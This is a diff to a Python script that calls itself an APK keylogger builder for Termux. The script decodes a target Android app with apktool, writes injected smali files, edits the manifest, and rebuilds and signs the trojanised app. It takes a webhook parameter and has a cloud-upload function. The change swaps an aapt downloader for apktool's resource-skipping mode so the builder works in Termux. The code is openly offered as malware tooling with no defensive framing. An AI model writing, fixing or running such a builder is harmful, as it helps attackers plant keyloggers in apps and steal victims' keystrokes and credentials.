@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v3.6 (AUTO‑FIX)
-  Detects missing aapt, downloads it, and injects keylogger.
+  TERMUX APK KEYLOGGER BUILDER v3.6 (NO AAPT REQUIRED)
+  Uses apktool -r to avoid resource compilation.
   Developer: GT Security Team
 ============================================================
 """
@@ -15,7 +15,6 @@ import uuid
 import json
 import time
 import requests
-import zipfile
 from datetime import datetime
 
 # ---------------------------- COLORS ----------------------------
@@ -34,57 +33,11 @@ class Colors:
 def print_c(msg, color=Colors.RESET):
     print(f"{color}{msg}{Colors.RESET}")
 
-# ---------------------------- AAPT AUTO‑INSTALLER ----------------------------
-AAPT_DIR = os.path.join(os.path.expanduser("~"), ".aapt_bin")
-AAPT_PATH = os.path.join(AAPT_DIR, "aapt")
-
-def ensure_aapt():
-    """Download aapt for ARM64 if not present, and return its path."""
-    if os.path.exists(AAPT_PATH):
-        return AAPT_PATH
-    print_c("[*] aapt not found. Downloading ARM64 version...", Colors.YELLOW)
-    os.makedirs(AAPT_DIR, exist_ok=True)
-    # URL from Google's build-tools (latest stable)
-    url = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
-    zip_path = os.path.join(AAPT_DIR, "build-tools.zip")
-    try:
-        print_c("[*] Downloading build-tools (this may take a moment)...", Colors.YELLOW)
-        response = requests.get(url, stream=True, timeout=120)
-        if response.status_code != 200:
-            raise Exception("Download failed")
-        with open(zip_path, "wb") as f:
-            for chunk in response.iter_content(chunk_size=8192):
-                f.write(chunk)
-        # Extract only aapt
-        with zipfile.ZipFile(zip_path, "r") as zip_ref:
-            # The zip contains aapt in linux/aapt (or just aapt)
-            # Try common paths
-            for name in zip_ref.namelist():
-                if name.endswith("aapt") and not name.endswith("aapt2"):
-                    with zip_ref.open(name) as src, open(AAPT_PATH, "wb") as dst:
-                        dst.write(src.read())
-                    break
-        os.chmod(AAPT_PATH, 0o755)
-        os.remove(zip_path)
-        print_c("[✓] aapt installed at: " + AAPT_PATH, Colors.GREEN)
-        return AAPT_PATH
-    except Exception as e:
-        print_c("[!] Failed to download aapt: " + str(e), Colors.RED)
-        print_c("[!] Please install aapt manually: pkg install aapt", Colors.YELLOW)
-        sys.exit(1)
-
-def get_aapt():
-    """Return path to aapt, either from system or downloaded."""
-    system_aapt = shutil.which("aapt")
-    if system_aapt:
-        return system_aapt
-    return ensure_aapt()
-
 # ---------------------------- DEPENDENCY CHECK ----------------------------
 def check_dependencies():
     tools = {
-        'apktool': 'pkg install apktool -y OR manual install',
-        'java': 'pkg install openjdk-17 -y OR openjdk-25',
+        'apktool': 'pkg install apktool -y',
+        'java': 'pkg install openjdk-17 -y',
         'zipalign': 'pkg install zipalign -y',
     }
     missing = []
@@ -322,14 +275,15 @@ def upload_to_cloud(filepath):
         pass
     return None
 
-# ---------------------------- INJECTION ENGINE (WITH AUTO AAPT) ----------------------------
+# ---------------------------- INJECTION ENGINE (NO AAPT) ----------------------------
 def inject_apk(input_apk, output_dir, webhook, features, interval):
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
     os.makedirs(work_dir, exist_ok=True)
 
     try:
-        print_c("[*] Decoding APK...", Colors.YELLOW)
-        decode_cmd = [shutil.which('apktool'), "d", input_apk, "-o", work_dir, "-f"]
+        # ---------- DECODE WITH -r (skip resources) ----------
+        print_c("[*] Decoding APK (resources skipped)...", Colors.YELLOW)
+        decode_cmd = [shutil.which('apktool'), "d", "-r", input_apk, "-o", work_dir, "-f"]
         result = subprocess.run(decode_cmd, capture_output=True, text=True)
         if result.returncode != 0:
             print_c("[!] Decode failed:", Colors.RED)
@@ -349,7 +303,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             f.write(inner_smali)
         print_c("[DEBUG] Smali files written to: " + smali_dir, Colors.CYAN)
 
-        # Modify manifest
+        # Modify manifest (still decoded as XML)
         manifest_path = os.path.join(work_dir, "AndroidManifest.xml")
         with open(manifest_path, "r") as f:
             manifest = f.read()
@@ -372,24 +326,19 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         with open(manifest_path, "w") as f:
             f.write(manifest)
 
-        # ---------- REBUILD WITH FORCED AAPT ----------
-        aapt_path = get_aapt()  # auto‑downloads if missing
-        print_c("[*] Using aapt from: " + aapt_path, Colors.CYAN)
-        env = os.environ.copy()
-        env['AAPT'] = aapt_path
-
+        # ---------- REBUILD (no aapt needed) ----------
         print_c("[*] Rebuilding APK...", Colors.YELLOW)
         apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
         build_cmd = [shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned]
 
-        result = subprocess.run(build_cmd, env=env, capture_output=True, text=True)
+        result = subprocess.run(build_cmd, capture_output=True, text=True)
         if result.returncode != 0:
             print_c("[!] Build failed:", Colors.RED)
             print_c(result.stderr, Colors.RED)
             shutil.rmtree(work_dir, ignore_errors=True)
-            raise Exception("APK rebuild failed. Try manually installing aapt: pkg install aapt")
+            raise Exception("APK rebuild failed. Ensure apktool is working.")
 
-        # Sign & align
+        # Sign & align (unchanged)
         print_c("[*] Signing APK...", Colors.YELLOW)
         apk_signed = os.path.join(work_dir, "app-signed.apk")
         sign_cmd = [
@@ -457,7 +406,7 @@ def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
     ║   APK KEYLOGGER BUILDER v3.6             ║
-    ║   Auto‑aapt installer, no more errors    ║
+    ║   No aapt required – works in Termux     ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
